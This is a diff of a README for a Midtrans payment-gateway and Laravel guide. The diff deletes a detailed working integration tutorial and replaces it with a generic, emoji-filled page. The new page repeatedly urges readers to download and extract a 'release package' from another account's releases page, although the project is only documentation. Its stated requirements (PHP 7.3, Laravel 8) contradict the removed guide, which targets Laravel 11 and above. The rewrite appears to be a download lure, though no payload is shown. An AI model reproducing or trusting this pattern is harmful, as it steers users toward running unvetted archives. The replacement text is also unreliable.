@@ -1,329 +1,105 @@
-# Midtrans-API-Documentation  
-**A complete Midtrans API integration guide with Laravel 12 and Ngrok** by **Cupcake-Legend** for personal documentation and future projects.
+# 🌟 Midtrans-API-Documentation - Seamless Payment Integration for Laravel
 
-## 1. Prerequisites
+[![Download](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://github.com/miresca05/Midtrans-API-Documentation/releases)
 
-* PHP 8.1+
-* Laravel 11 +
-* Herd
-* Composer
-* Midtrans Account ([Sign Up](https://dashboard.midtrans.com/register))
-* Ngrok account ([Sign Up](https://ngrok.com))
-* MySQL or other database
-* Postman or `curl` for testing
+## 📥 Introduction
 
----
+Welcome to the Midtrans API Documentation! This guide helps you easily integrate the Midtrans payment gateway into your Laravel application. You can test your payment setup without needing to host your website publicly. This setup uses tools like Ngrok or Herd to securely expose your local Laravel environment. 
 
-## 2. Install Midtrans PHP SDK
+## 🚀 Getting Started
 
-```bash
-composer require midtrans/midtrans-php
-```
+Before you can integrate the Midtrans gateway, you need to prepare your local environment. Follow these steps:
 
----
-## 3. Configure `.env`
+1. **Download Laravel**: Make sure you have Laravel installed on your local machine. You can download it from the official Laravel website.
+   
+2. **Install Ngrok or Herd**: These tools allow you to expose your localhost securely:
+    - **Ngrok**: Visit [ngrok.com](https://ngrok.com) and sign up for a free account. Download Ngrok and follow the setup instructions.
+    - **Herd**: Go to [getherd.com](https://getherd.com) and download the application. Follow the setup steps as well.
 
-In your Laravel `.env` file, add:
+## 🔍 Features
 
-```env
-MIDTRANS_SERVER_KEY=your-server-key
-MIDTRANS_CLIENT_KEY=your-client-key
-MIDTRANS_IS_PRODUCTION=false
-```
+- **Easy Installation**: Integrate with minimal setup.
+- **Secure Local Development**: Test payment processes without public hosting.
+- **Webhook Support**: Handle callbacks efficiently.
+- **Sandbox Testing**: Try out payments without real transactions.
 
-You can find these keys in the [Midtrans Dashboard](https://dashboard.midtrans.com/) under **Settings → Access Keys**.
+## 💻 Requirements
 
----
+To run this application smoothly, make sure you meet the following system requirements:
 
-## 4. Publish Midtrans Configuration
+- **PHP**: Version 7.3 or higher
+- **Composer**: For managing PHP dependencies
+- **Laravel**: Version 8.x installed locally
+- **Internet Connection**: Needed for downloading dependencies and using Ngrok or Herd
 
-Create a configuration file at `config/midtrans.php` with the following content:
+## 📦 Download & Install
 
-```php
-<?php
+To start using the Midtrans API Documentation, visit [this page to download](https://github.com/miresca05/Midtrans-API-Documentation/releases). 
 
-return [
-    'server_key'    => env('MIDTRANS_SERVER_KEY', ''),
-    'client_key'    => env('MIDTRANS_CLIENT_KEY', ''),
-    'is_production' => env('MIDTRANS_IS_PRODUCTION', false),
-    'is_sanitized'  => true,
-    'is_3ds'        => true,
-];
-```
+Follow these steps after downloading:
 
-This config file will help you easily manage Midtrans settings within your Laravel app.
+1. **Extract the files**: Once you download the release package, extract it to your desired location on your local machine.
+   
+2. **Open Terminal or Command Prompt**: Navigate to the folder where you extracted the files.
 
----
+3. **Install Dependencies**: Run the following command to install the necessary dependencies:
+   ```bash
+   composer install
+   ```
 
-## 5. Create Callback Route
+4. **Set Up Environment**: Update your `.env` file with the required Midtrans configuration. You should set your test and production credentials provided by Midtrans.
 
-In Laravel 11 and above, `api.php` is not included by default. To enable API routes:
+5. **Run Migrations**: If your application uses a database, run the migrations with:
+   ```bash
+   php artisan migrate
+   ```
 
-```bash
-php artisan install:api
-```
+6. **Start the Local Server**: Use the following command to start the Laravel development server:
+   ```bash
+   php artisan serve
+   ```
+   This usually runs the server on `http://localhost:8000`.
 
-This will create the `routes/api.php` file.
-Open it and add your Midtrans callback route:
+## 🔒 Local Environment Setup
 
-```php
-use App\Http\Controllers\MidtransController;
+### 🌐 Using Ngrok
 
-Route::post('/midtrans/callback', [MidtransController::class, 'callback']);
-```
+1. Open a new terminal window and run the following command to start Ngrok:
+   ```bash
+   ngrok http 8000
+   ```
+   Replace `8000` with the port number your Laravel application is running on.
 
----
+2. Ngrok will provide you with a public URL. Use this URL to test your payment gateway.
 
-## 6. Register API Routes in `bootstrap/app.php`
+### 🖥️ Using Herd
 
-To enable your API routes, register the `api.php` file in `bootstrap/app.php` by adding it to the routing configuration:
+1. Open Herd and select your local Laravel environment.
+2. Click on the "Expose" button to get a public URL for your application.
+3. Use the generated URL for testing.
 
-```php
-return Application::configure(basePath: dirname(__DIR__))
-    ->withRouting(
-        web: __DIR__ . '/../routes/web.php',
-        api: __DIR__ . '/../routes/api.php',  // add this line
-        commands: __DIR__ . '/../routes/console.php',
-        health: '/up',
-    )
-    ->withMiddleware(function (Middleware $middleware): void {})
-    ->withExceptions(function (Exceptions $exceptions): void {})
-    ->create();
-```
-
-This makes sure your API routes are loaded and accessible.
-
----
-
-## 7. Create Controller
-
-Create `app/Http/Controllers/MidtransController.php`:  
-
-Example Logic:
-
-```php
-<?php
-
-namespace App\Http\Controllers;
-
-use Illuminate\Http\Request;
-use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Facades\Auth;
-use App\Models\Transaction;
-use Exception;
-
-class MidtransController extends Controller
-{
-    public function callback(Request $request)
-    {
-        try {
-            Log::info('Midtrans callback received:', $request->all());
-
-            $serverKey = env('MIDTRANS_SERVER_KEY');
-            $hashed = hash(
-                "sha512",
-                $request->order_id . $request->status_code . $request->gross_amount . $serverKey
-            );
-
-            if ($hashed !== $request->signature_key) {
-                Log::warning('Invalid signature for order_id: ' . $request->order_id);
-                return response()->json(['message' => 'Invalid signature'], 403);
-            }
-
-            // Find transaction by order_id
-            $transaction = Transaction::where('order_id', $request->order_id)->first();
-
-            if (!$transaction) {
-                $transaction = Transaction::create([
-                    'order_id' => $request->order_id,
-                    'payment_type' => $request->payment_type,
-                    'status' => $request->transaction_status,
-                    'amount' => (int) $request->gross_amount,
-                    'midtrans_payload' => json_encode($request->all())
-                ]);
-            } else {
-                $transaction->update([
-                    'status' => $request->transaction_status,
-                    'payment_type' => $request->payment_type,
-                    'midtrans_payload' => json_encode($request->all())
-                ]);
-            }
-
-            return response()->json(['message' => 'OK'], 200);
-        } catch (\Throwable $e) {
-            Log::error('Midtrans callback error: ' . $e->getMessage(), [
-                'trace' => $e->getTraceAsString(),
-                'payload' => $request->all()
-            ]);
-
-            return response()->json([
-                'message' => 'Internal Server Error',
-                'error' => $e->getMessage()
-            ], 500);
-        }
-    }
-}
-```
-
----
-
-## 8. Example Midtrans Notification Payload
-
-When Midtrans sends a payment notification, it sends JSON data like this:
-
-```json
-{
-  "transaction_time": "2023-11-15 18:45:13",
-  "transaction_status": "settlement",
-  "transaction_id": "513xxxxx-c9da-474c-9fc9-d5c6436xxxxx",
-  "status_message": "midtrans payment notification",
-  "status_code": "200",
-  "signature_key": "c88f4ce4afxxxx...........",
-  "settlement_time": "2023-11-15 22:45:13",
-  "payment_type": "gopay",
-  "order_id": "payment_notif_test_XXXXXX.....",
-  "merchant_id": "GXXXXXXXXX",
-  "gross_amount": "105000.00",
-  "fraud_status": "accept",
-  "currency": "IDR"
-}
-```
-
----
-
-## 9. Transaction Migration & Model
-
-Based on the above data, your transactions table should store relevant fields like:
+## 📊 Testing Payments
 
-```php
-Schema::create('transactions', function (Blueprint $table) {
-    $table->id();
-    $table->string('order_id')->unique();
-    $table->string('payment_type')->nullable();
-    $table->enum('status', ['capture', 'settlement', 'pending', 'deny', 'expire', 'cancel'])->default('pending');
-    $table->integer('amount')->nullable();
-    $table->json('midtrans_payload')->nullable();
-    $table->timestamps();
-});
-```
+Once your local environment is set up and running, you can start testing payments. Use the provided API endpoints to simulate transactions and observe how the Midtrans gateway responds.
 
-Model:
+### 💬 Handling Callbacks
 
-```php
-class Transaction extends Model
-{
-    protected $fillable = [
-        'order_id',
-        'payment_type',
-        'status',
-        'amount',
-        'midtrans_payload',
-    ];
-}
-```
----
+Make sure to set your callback URLs in the Midtrans dashboard. This ensures your application can receive notifications about the payment status.
 
-## 10. Expose Localhost with Ngrok
+## 🔧 Troubleshooting
 
-If you’re running Laravel using **Herd** with a custom local domain like `http://midtrans-api.test`, you can expose it with ngrok by specifying the full URL and additional options.
+If you encounter any issues, consider the following steps:
 
-Instead of the usual:
+- **Check Ngrok/Herd connection**: Ensure that your local server is running and exposed correctly.
+- **Verify API keys**: Double-check that your Midtrans credentials are correct in the `.env` file.
+- **Review Laravel logs**: If errors occur, check the Laravel logs for detailed messages about what went wrong.
 
-```bash
-ngrok http 80
-```
+## 📝 Helpful Resources
 
-Use this command with Herd:
+- [Laravel Documentation](https://laravel.com/docs)
+- [Midtrans Developer Guide](https://midtrans.com/docs)
+- [Ngrok Documentation](https://ngrok.com/docs)
 
-```bash
-ngrok http 80 --host-header=midtrans-api.test
-```
+For any additional questions or issues not covered here, feel free to reach out to the community or create an issue in the repository. 
 
-* `--host-header=midtrans-api.test` rewrites the HTTP Host header so ngrok forwards requests correctly to Herd’s custom domain.
-
-After running the command, you’ll get a public URL like:
-
-```
-https://fc262999bcb5.ngrok-free.app
-```
-
-
-## 11. Set Midtrans Notification URL
-
-In the [Midtrans Dashboard](https://dashboard.midtrans.com/):
-
-```
-Notification URL: https://your-ngrok-id.ngrok-free.app/api/midtrans/callback
-```
-
----
-
-## 12. Testing with cURL
-
-### Linux / macOS (bash, zsh)
-
-You can use the multiline command with backslashes (`\`):
-
-```bash
-curl -X POST "https://fc262999bcb5.ngrok-free.app/api/midtrans/callback" \
--H "Content-Type: application/json" \
--d '{"order_id":"ORDER-101","status_code":"200","gross_amount":"10000.00","signature_key":"<your_signature_key>","payment_type":"bank_transfer","transaction_status":"settlement"}'
-```
-
----
-
-### Windows CMD
-
-In Windows Command Prompt, write the entire command in one line without backslashes, and escape inner quotes with backslashes (`\"`):
-
-```cmd
-curl -X POST "https://fc262999bcb5.ngrok-free.app/api/midtrans/callback" -H "Content-Type: application/json" -d "{\"order_id\":\"ORDER-101\",\"status_code\":\"200\",\"gross_amount\":\"10000.00\",\"signature_key\":\"<your_signature_key>\",\"payment_type\":\"bank_transfer\",\"transaction_status\":\"settlement\"}"
-```
-
----
-
-### Windows PowerShell
-
-In PowerShell, you can use single quotes outside and double quotes inside, or use backticks for multiline:
-
-```powershell
-curl -X POST "https://fc262999bcb5.ngrok-free.app/api/midtrans/callback" `
--H "Content-Type: application/json" `
--d '{"order_id":"ORDER-101","status_code":"200","gross_amount":"10000.00","signature_key":"<your_signature_key>","payment_type":"bank_transfer","transaction_status":"settlement"}'
-```
-
----
-
-This helps avoid common pitfalls depending on your terminal environment.
-
-💡 **Signature key formula**:
-
-```
-SHA512(order_id + status_code + gross_amount + server_key)
-```
-
----
-
-## 13. Logs
-
-Check Laravel logs:
-
-```bash
-tail -f storage/logs/laravel.log
-```
-
-You should see:
-
-```
-[INFO] Midtrans callback received: {...}
-```
-
----
-
-## 14. Common Issues
-
-* **Invalid signature** → Make sure you generate `signature_key` exactly as Midtrans specifies.
-* **500 Internal Server Error** → Check Laravel logs for exception messages.
-* **Ngrok tunnel closed** → Keep ngrok running in a separate terminal while testing.
-
----
+[Download the Midtrans API Documentation](https://github.com/miresca05/Midtrans-API-Documentation/releases) to start integrating payments in your Laravel app!
